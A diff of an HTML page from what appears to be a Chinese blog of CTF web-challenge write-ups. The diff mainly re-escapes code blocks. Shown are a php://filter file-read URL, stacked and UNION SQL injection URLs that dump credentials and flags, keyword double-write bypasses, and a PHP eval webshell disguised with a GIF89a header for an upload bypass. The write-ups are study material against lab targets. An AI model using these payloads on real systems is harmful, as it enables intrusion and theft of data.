@@ -345,7 +345,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.4k
+                    9.5k
                 </div>
                 
 
@@ -361,9 +361,6 @@
         </div>
         <hr class="clearfix">
 
-        
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
         
 
         
@@ -397,60 +394,60 @@
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724631.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还有一个线索可以去<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724597.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <p> 进入这个php得到线索，返回source.php进行代码审计</p>
 <p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041724558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);
-    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span>
-<span class="class">    </span>{
-        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&<span class="variable">$page</span></span>)</span>
-<span class="function">        </span>{
-            <span class="variable">$whitelist</span> = [<span class="string">"source"</span>=><span class="string">"source.php"</span>,<span class="string">"hint"</span>=><span class="string">"hint.php"</span>];<span class="comment">//定义了白名单</span>
-            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) {
-                <span class="keyword">echo</span> <span class="string">"you can&#x27;t see it"</span>;
-                <span class="keyword">return</span> <span class="literal">false</span>;
-            }
-            <span class="comment">//判断 当page存在或者page是字符串时，返回true</span>
-            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) {
-                <span class="keyword">return</span> <span class="literal">true</span>;
-            }
-            <span class="comment">//白名单过滤,需要传入的page中由source.php或者hint.php</span>
-            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(
-                <span class="variable">$page</span>,
-                <span class="number">0</span>,
-                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+    highlight_file(__FILE__);
+    class emmm
+    &#123;
+        public static function checkFile(&amp;$page)
+        &#123;
+            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];&#x2F;&#x2F;定义了白名单
+            if (! isset($page) || !is_string($page)) &#123;
+                echo &quot;you can&#39;t see it&quot;;
+                return false;
+            &#125;
+            &#x2F;&#x2F;判断 当page存在或者page是字符串时，返回true
+            if (in_array($page, $whitelist)) &#123;
+                return true;
+            &#125;
+            &#x2F;&#x2F;白名单过滤,需要传入的page中由source.php或者hint.php
+            $_page &#x3D; mb_substr(
+                $page,
+                0,
+                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)
             );
-            <span class="comment">//mb_substr() 函数返回字符串的一部分,返回到0到mb_strpos的内容。</span>
-            <span class="comment">//mb_strpos() 查找字符串在另一个字符串中首次出现的位置</span>
-            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) {
-                <span class="keyword">return</span> <span class="literal">true</span>;
-            }
-            <span class="comment">//查看page是否存在在白名单里面</span>
-            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);
-            <span class="comment">//对page进行一次decode解码 </span>
-            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(
-                <span class="variable">$_page</span>,
-                <span class="number">0</span>,
-                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)
+            &#x2F;&#x2F;mb_substr() 函数返回字符串的一部分,返回到0到mb_strpos的内容。
+            &#x2F;&#x2F;mb_strpos() 查找字符串在另一个字符串中首次出现的位置
+            if (in_array($_page, $whitelist)) &#123;
+                return true;
+            &#125;
+            &#x2F;&#x2F;查看page是否存在在白名单里面
+            $_page &#x3D; urldecode($page);
+            &#x2F;&#x2F;对page进行一次decode解码 
+            $_page &#x3D; mb_substr(
+                $_page,
+                0,
+                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)
             );
-            <span class="comment">//与上面一样，查看俩个?之间的内容</span>
-            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) {
-                <span class="keyword">return</span> <span class="literal">true</span>;
-            }
-            <span class="comment">//查看是否存在白名单</span>
-            <span class="keyword">echo</span> <span class="string">"you can&#x27;t see it"</span>;
-            <span class="keyword">return</span> <span class="literal">false</span>;
-        }
-    }
+            &#x2F;&#x2F;与上面一样，查看俩个?之间的内容
+            if (in_array($_page, $whitelist)) &#123;
+                return true;
+            &#125;
+            &#x2F;&#x2F;查看是否存在白名单
+            echo &quot;you can&#39;t see it&quot;;
+            return false;
+        &#125;
+    &#125;
 
-    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])
-        && <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])
-        && emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])
-    ) {
-        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];
-        <span class="keyword">exit</span>;
-    } <span class="keyword">else</span> {
-        <span class="keyword">echo</span> <span class="string">"<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span>;
-    }  
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+    if (! empty($_REQUEST[&#39;file&#39;])
+        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])
+        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])
+    ) &#123;
+        include $_REQUEST[&#39;file&#39;];
+        exit;
+    &#125; else &#123;
+        echo &quot;&lt;br&gt;&lt;img src&#x3D;\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\&quot; &#x2F;&gt;&quot;;
+    &#125;  
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <p> 所以构造payload，得到flag</p>
@@ -513,7 +510,7 @@
 <p>再尝试下爆190那个表  <strong>1’;show columns from <code>1919810931114514</code>– q</strong>  发现有flag线索</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041728905.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <p> 但是，如果要接着直接查这个flag就会出现问题了，select等关键词被过滤了，所以我们只能另辟蹊径，根据从网上大佬的wp学习，可以将<strong>1919810931114514</strong>改名为<strong>words</strong>这个表，然后再将<strong>words</strong>这个表改成其他名字，添加<strong>id</strong>字段，将<strong>flag</strong>改为<strong>data</strong>，最后通过系统的select帮我们查出flag具体代码如下:</p>
-<pre class="line-numbers language-highlight SQL"><span class="number">1</span><span class="string">&#x27;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#x27;</span><span class="number">12</span><span class="string"><code class="language-highlight SQL"><span class="number">1</span><span class="string">&#x27;;rename table words to word2;rename table `1919810931114514` to words;ALTER TABLE words ADD id int(10) DEFAULT &#x27;</span><span class="number">12</span><span class="string">&#x27;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">1&#39;;rename table words to word2;rename table &#96;1919810931114514&#96; to words;ALTER TABLE words ADD id int(10) DEFAULT &#39;12&#39;;ALTER TABLE  words CHANGE flag data VARCHAR(100);-- q<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <p>然后通过  <strong>1’ or 1&#x3D;1;#</strong>  直接得到flag。如果不放心，你也可以通过上面的爆表，爆库确认一下是否改名成功，有所变化。</p>
@@ -543,7 +540,7 @@
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733873.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现flag，尝试抓取它</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041733875.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 但是回显是nonono。到这基本上我就寄了，转去网上找大佬wp学习</p>
 <p>大佬猜测后端是如下代码，有着一个或结构。</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">select $_POST[&#x27;query&#x27;] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">select $_POST[&#39;query&#39;] || flag from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <p>所以只需要将**$_POST[‘query’]** 变成 ***,1**便可以得到flag 。此时语句会变成</p>
@@ -567,7 +564,7 @@
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734012.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 如果傻傻的去访问这个flag.php，那么依旧是什么都得不到</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041734008.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 结合这句话和代码审计里面的 input data。很难不让人想到php伪协议，</p>
 <p>所以我们可以构建这个url </p>
-<pre class="line-numbers language-highlight html"><code class="language-highlight html">url+/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">url+/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到一大串base64编码，解密一下就可以得到flag了</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735713.png"><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041735731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
@@ -575,14 +572,14 @@
 <p>发现用1’是有报错，而1”回显错误账号和密码，所以猜测为用’闭合 </p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736511.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 用联合注入爆破所有数据库</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736319.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">尝试爆该表字段，构造url</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27;%23&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;l0ve1ysq1&#39;%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到其中字段</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736152.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 所以我们在抓取其中字段内容，构造url</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; union select 1,2,group_concat(id,username,password) from l0ve1ysq1%23&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">得到flag </p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041736406.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
@@ -613,12 +610,12 @@
 <h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><h3 id="一、本题做题思路-8"><a href="#一、本题做题思路-8" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>上传题，先上传个php文件看看回显</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741044.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">看来没戏，尝试用图片绕过，然后BP抓包</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041741781.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 发现其还会对图片内容进行读取，所以我们需要修改图片里的内容，将里面的一句话木马换种方式书写，将其修改为如下代码。</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext"><script language=&#x27;php&#x27;>eval($_POST[&#x27;ru&#x27;]);</script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现还是不行，又出现一个新的回显， <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742216.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">到了这步就要用到一个新的东西，即<strong>文件幻术头绕过</strong>，详情可看这位<a target="_blank" rel="noopener" href="https://blog.csdn.net/since_2020/article/details/119414380">大佬博客</a>来进行了解</p>
 <p>总之就是要在上面所述代码内容上面再添加图片文件头(十六进制转换为的字符)</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">GIF89a
-<script language=&#x27;php&#x27;>eval($_POST[&#x27;ru&#x27;]);</script><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">GIF89a
+&lt;script language&#x3D;&#39;php&#39;&gt;eval($_POST[&#39;ru&#39;]);&lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">回显虽然是上传成功，但是无法从蚁剑内连接进入，通过BP将其后缀修改为.phtml（这里如果你把后缀改成.php7 虽然绕过他对php的检查，但是没法蚁剑连接不进去，也可能是我自己的问题。）</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041742189.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">构造payload   <strong>url+&#x2F;upload&#x2F;xxxx.phtml</strong> 放入蚁剑内连接进入</p>
@@ -637,20 +634,20 @@
 <h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="一、本题做题思路-10"><a href="#一、本题做题思路-10" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>先看看它是什么闭合方式，通过对比，发现其还是由’闭合</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744401.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744416.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑fuzz测试，发现过滤字符，</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041744443.png">尝试双写绕过，先看看有几个字段</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; oorrder bbyy 4 --+&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; oorrder bbyy 4 --+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745244.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">用三回显不同，所以有三个字段，判断一下注入点</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,3 --+&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,3 --+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041745204.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">发现回显为在第二个字段和第三个字段。来查询一下它里面所有的库</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746558.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动">编辑 再接下来就是查询表中字段咯，和上面一道sql题一样，不过这次要双写绕过。</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name=&#x27;Flag&#x27;--+&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whewherere table_name&#x3D;&#39;Flag&#39;--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746538.png"></p>
 <p> 再查询一下字段中的内容</p>
-<pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">url+/check.php?username=1&#x27; uniunionon seleselectct 1,2,group_concat(flag) frfromom ctf.Flag--+&password=1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">url+&#x2F;check.php?username&#x3D;1&#39; uniunionon seleselectct 1,2,group_concat(flag) frfromom ctf.Flag--+&amp;password&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 得到flag</p>
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041746488.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p>
@@ -661,64 +658,64 @@
 <p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041749855.png"></p>
 <p>查询一番能得到的线索从class.php和index.php得到</p>
 <p><strong>class.php</strong></p>
-<pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span>
-<span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
+include &#39;flag.php&#39;;
 
 
-<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);
+error_reporting(0);
 
 
-<span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>{
-    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;
-    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;
+class Name&#123;
+    private $username &#x3D; &#39;nonono&#39;;
+    private $password &#x3D; &#39;yesyes&#39;;
 
-    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>{
-        <span class="variable language_">$this</span>->username = <span class="variable">$username</span>;
-        <span class="variable language_">$this</span>->password = <span class="variable">$password</span>;
-    }
+    public function __construct($username,$password)&#123;
+        $this-&gt;username &#x3D; $username;
+        $this-&gt;password &#x3D; $password;
+    &#125;
 
-    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{
-        <span class="variable language_">$this</span>->username = <span class="string">&#x27;guest&#x27;</span>;
-    }
+    function __wakeup()&#123;
+        $this-&gt;username &#x3D; &#39;guest&#39;;
+    &#125;
 
-    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{
-        <span class="keyword">if</span> (<span class="variable language_">$this</span>->password != <span class="number">100</span>) {
-            <span class="keyword">echo</span> <span class="string">"</br>NO!!!hacker!!!</br>"</span>;
-            <span class="keyword">echo</span> <span class="string">"You name is: "</span>;
-            <span class="keyword">echo</span> <span class="variable language_">$this</span>->username;<span class="keyword">echo</span> <span class="string">"</br>"</span>;
-            <span class="keyword">echo</span> <span class="string">"You password is: "</span>;
-            <span class="keyword">echo</span> <span class="variable language_">$this</span>->password;<span class="keyword">echo</span> <span class="string">"</br>"</span>;
-            <span class="keyword">die</span>();
-        }
-        <span class="keyword">if</span> (<span class="variable language_">$this</span>->username === <span class="string">&#x27;admin&#x27;</span>) {
-            <span class="keyword">global</span> <span class="variable">$flag</span>;
-            <span class="keyword">echo</span> <span class="variable">$flag</span>;
-        }<span class="keyword">else</span>{
-            <span class="keyword">echo</span> <span class="string">"</br>hello my friend~~</br>sorry i can&#x27;t give you the flag!"</span>;
-            <span class="keyword">die</span>();
+    function __destruct()&#123;
+        if ($this-&gt;password !&#x3D; 100) &#123;
+            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;
+            echo &quot;You name is: &quot;;
+            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;
+            echo &quot;You password is: &quot;;
+            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;
+            die();
+        &#125;
+        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;
+            global $flag;
+            echo $flag;
+        &#125;else&#123;
+            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;
+            die();
 
             
-        }
-    }
-}
-<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        &#125;
+    &#125;
+&#125;
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
